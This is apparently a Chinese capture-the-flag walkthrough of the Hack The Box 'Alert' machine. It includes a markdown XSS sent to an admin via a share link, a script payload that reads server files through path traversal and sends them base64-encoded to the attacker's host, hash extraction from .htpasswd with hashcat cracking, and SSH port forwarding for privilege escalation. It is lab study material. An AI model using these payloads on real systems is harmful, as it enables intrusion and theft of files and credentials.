> 知识点
>
> - 信息收集
> - Self-XSS利用
> - 漏洞利用--盲打数据外带
> - 密码破解
> - 配置不当权限提升
> - 端口转发（可选）

# 相关信息

靶机：Alert Linux · Easy  IP：**10.10.11.44**

VPS：10.10.16.2

本地虚拟机：10.8.0.2

# 端口扫描

![image-20241130161051977](..\..\..\images\image-20241130161051977.png)

# Web渗透

## md上传预览功能

![image-20241130161200323](../../..\images\image-20241130161200323.png)

白名单文件上传只能上传.md文件，存在XSS

```markdown
[a](javascript:alert(window.location))
```

![image-20241130161443778](../../..\images\image-20241130161443778.png)

但是self-xss没有危害，不过这里右下角有一个share功能，如果可以分享给管理员那么就可以进行攻击

## 联系功能

### POC测试

那么先拿一个poc测试，md内容

```html
<iframe src="http://10.10.8.2:8888/test" width="500" height="100">
```

将该文件的分享链接发送给管理员

![image-20241130162235159](../../..\images\image-20241130162235159.png)

![image-20241130162312107](../../..\images\image-20241130162312107.png)

可以看到靶机发送的请求，证明可以使用XSS来进行攻击

### 读取文件

```js
<script>
fetch("http://alert.htb/messages.php?file=../../../../../../../filepath")
  .then(response => response.text())
  .then(data => {
    fetch("http://10.10.16.2:8888/?file_content=" + btoa(data));
  });
</script>
```

> 注意外带数据最好要进行编码，防止不合法字符

Payload

![image-20241130162818322](../../..\images\image-20241130162818322.png)

```php
filepath=/proc/self/cmdline  
```

```php
<pre>/usr/sbin/apache2.-k.start.</pre>
```

获得了服务器的中间件为apache

```php
filepath=/etc/apache2/sites-enabled/000-default.conf # Apache 服务器的默认虚拟主机配置文件，通常是 Apache 安装时自动创建的
```

```php
<Directory /var/www/statistics.alert.htb>
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        AuthType Basic
        AuthName "Restricted Area"
        AuthUserFile /var/www/statistics.alert.htb/.htpasswd
        Require valid-user
    </Directory>
```

获得了敏感信息`AuthUserFile /var/www/statistics.alert.htb/.htpasswd`（.htpasswd用于存储 Apache Web 服务器的用户认证密码）

```
filepath=/var/www/statistics.alert.htb/.htpasswd
```

```php
<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
</pre>
```

获得了用户密码密文

## 密码爆破

```cmd
hashcat.exe  -m 1600  -a  0  "D:\Note\pass.txt" "D:\Global\apps\wordlists\kali-master\rockyou.txt"
```



# 主机渗透

## 信息收集

![image-20241130164329994](../../..\images\image-20241130164329994.png)

![image-20241130164408916](../../..\images\image-20241130164408916.png)

root权限的php web服务

![image-20241130164505466](../../..\images\image-20241130164505466.png)

配置错误，monitors目录属于root，但是其他用户具有写权限，可以通过向该目录写入恶意PHP文件进行提权



## 提升权限

![image-20241130164725047](../../..\images\image-20241130164725047.png)

这里要注意的是监听的本地8080端口，而php脚本文件需要访问一次才能解析执行，所以需要curl这个文件，还有一种方法是进行端口转发

```cmd
ssh -CfNg -L 8080:127.0.0.1:8080 albert@10.10.11.44 # 通过albert@10.10.11.44将127.0.0.1:8080端口转发到本地8080端口
```

参考[SSH 端口转发教程 | 三点水 (lotabout.me)](https://lotabout.me/2019/SSH-Port-Forwarding/)

![image-20241130165209462](../../..\images\image-20241130165209462.png)

![image-20241130155510001](../../..\images\image-20241130155510001.png)







